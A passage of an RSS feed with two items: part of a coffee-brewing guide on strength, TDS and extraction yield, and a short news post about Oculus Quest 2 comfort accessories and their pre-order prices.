<h2><span><b><i>4. The Brew Variables</i></b></span></h2>
<p><span>There are several brew variables that will affect the taste (e.g., extraction yield) and strength of your cup:</span></p>
<ul>
<li>
<ul>
<li><span>Coffee to water ratio<br></span></li>
<li><span>Coffee beans quality</span></li>
<li><span>Roast profile and quality</span></li>
<li>Grind size</li>
<li>Grind uniformity</li>
<li>Coffee freshness</li>
<li>Filter quality</li>
<li>Brew temperature</li>
<li>Water agitation</li>
<li>Uniformity of extraction and repeatability</li>
<li>Water quality</li>
<li>Contact time between water and grounds</li>
</ul>
</li>
</ul>
<p><span>These are not listed in order of importance, but rather in order that we will discuss them.</span></p>
<h3><span><b><i>4.1 Coffee to Water Ratio</i></b></span></h3>
<p><span>It is useful to describe two relevant ways in which a coffee cup can vary: (1) strength, and (2) extraction yield. Strength is basically just how concentrated your coffee is, e.g. an espresso is much stronger than a filter coffee. The clarity of a coffee cup will be affected by this (but also by many other things). The strength is typically measured in ‚Äútotal dissolved solids‚Äù (TDS). It corresponds to the fraction mass of all non-H</span><span><sub>2</sub></span><span>O stuff in your cup, and can be measured with refractometers. Some Brix optical refractometers can be bought for ~20 $; (I use <a href="https://www.amazon.com/gp/product/B01LW4HHRC/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B01LW4HHRC&amp;linkCode=as2&amp;tag=coffeeadastra-20&amp;linkId=a9b009e1cd67a3ec622e7f14958fca92"><span>this one</span></a>), but their precision is not great at ~0.1‚Äì0.2% TDS (you also need to convert ¬∞Brix to TDS with <a href="http://coffeegeek.com/forums/coffee/machines/203992"><span>Alan Adler‚Äôs</span></a> relation; TDS = 0.85 x ¬∞Brix). Refractometers can be very useful for diagnostics and communication, even though they shouldn‚Äôt replace your taste buds. More precise refractometers cost a few hundred dollars. Ideally, you want a brew strength high enough without overwhelming your senses, so that you can appreciate the full aromatic complexity of your cup of coffee. This is a matter of personal preference (and context; an espresso will be perceived as very weak if it has double the strength of a filter coffee), but most people prefer a strength of 1.15‚Äì1.35% TDS.</span></p>
<p><span>Extraction yield is the total mass fraction of your coffee grounds that was dissolved into your cup of coffee. This variable will mostly affect the taste profile of your cup, because different compounds dissolve in water at different rates. You can use less coffee with a higher extraction yield and end up with the same strength, but you will have a larger extraction yield, and your taste profile will contain more of the aromatic compounds that are longer to extract from the coffee bean. Typical preferred extractions are in the range 18‚Äì22%, and a higher ‚Ä¶</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://coffeeadastra.com/2018/11/30/brewing-better-coffee/">https://coffeeadastra.com/2018/11/30/brewing-better-coffee/</a></em></p>]]>
            </description>
            <link>https://coffeeadastra.com/2018/11/30/brewing-better-coffee/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574431</guid>
            <pubDate>Thu, 24 Sep 2020 01:36:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Oculus Quest 2 spending design time on comfort]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24574155">thread link</a>) | @vrfinal
<br/>
September 23, 2020 | https://www.vrfinal.com/oculus-quest-2-comfort-accessories-pre-orders-open/ | <a href="https://web.archive.org/web/*/https://www.vrfinal.com/oculus-quest-2-comfort-accessories-pre-orders-open/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                  <div><p>The sequel to the <em>Oculus Quest</em>, the <em>Quest 2</em>, was <a href="https://www.vrfinal.com/oculus-quest-2-officially-announced-heres-the-scoop/">revealed earlier this month at Facebook Connect</a>. <a href="https://www.vrfinal.com/quest-2-leak/">Since rumours started circulating</a>, much has been made of the headset‚Äôs emphasis on comfort and immersion ‚Äì the <em>Quest 2</em> is 10% lighter and comes fitted with soft-touch fabric head straps. But the headset was also said to ‚Äúsupport a new line of optional" add-ons to bring comfort to the next level. Now, pre-orders have opened for the first of these accessories.</p><p>The <em>VR Cover</em> is a customisable facial interface and foam replacement set designed to increase ‚Äúhygiene, comfort and immersion.‚Äù Although the <em>VR Cover</em> has been popular among <em>Quest</em> users for years, the <em>Quest 2</em> interface includes ‚Äúvents added along the top to maintain good air circulation and reduce the build-up of heat and moisture that can fog up the lenses.‚Äù Two versions of the foam insert will be included ‚Äì ‚Äòstandard‚Äô and ‚Äòcomfort‚Äô. <a href="https://www.oculus.com/quest-2/accessories">Pre-orders for the <em>VR Cover</em> are open now</a>, priced at $29.</p></div><figure><img src="https://www.vrfinal.com/content/images/2020/09/VR-Cover.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/09/VR-Cover.jpg 600w, https://www.vrfinal.com/content/images/2020/09/VR-Cover.jpg 1000w" sizes="(min-width: 720px) 720px"><figcaption>The <em>VR Cover </em>will increase hygiene, comfort, ventilation and immersion. (Credit: Facebook/Oculus)</figcaption></figure><p>The <em>Elite Strap</em> was also unveiled last week. First impressions of the <em>Quest 2</em> show us that although comfort was addressed, the weight of the device still sometimes seems to cause issues. The <em>Elite Strap</em> is intended to fix this problem. Armed with a plastic arm to better bare the <em>Quest 2</em>‚Äôs weight, the <em>Elite Strap</em> also features a dial at the back to form the perfect fit on your head. <a href="https://www.oculus.com/quest-2/accessories">The <em>Elite Strap</em> is available now for pre-orders</a> at a price of $49. Facebook is also releasing another version with a battery pack and a carry case for $129.</p><figure><img src="https://www.vrfinal.com/content/images/2020/09/Elite-strap.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/09/Elite-strap.jpg 600w, https://www.vrfinal.com/content/images/size/w1000/2020/09/Elite-strap.jpg 1000w, https://www.vrfinal.com/content/images/size/w1600/2020/09/Elite-strap.jpg 1600w, https://www.vrfinal.com/content/images/2020/09/Elite-strap.jpg 1920w" sizes="(min-width: 720px) 720px"><figcaption>The <em>Elite Strap </em>helps bare the load of the Quest 2, which can feel heavy even with a 10% weight reduction. (Credit: Facebook/Oculus)</figcaption></figure><p>With these accessories at the forefront of Facebook‚Äôs approach to the <em>Quest 2</em>, its clear comfort is still king in creating their most immersive VR experience yet. Just as well because I can foresee myself spending a lot of time playing <a href="https://www.vrfinal.com/splinter-cell-and-assassins-creed-games-are-coming-to-vr/">these Quest exclusives</a>!</p>
                </div></div>]]>
            </description>
            <link>https://www.vrfinal.com/oculus-quest-2-comfort-accessories-pre-orders-open/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574155</guid>
            <pubDate>Thu, 24 Sep 2020 00:51:03 GMT</pubDate>
        </item>
    </channel>
</rss>
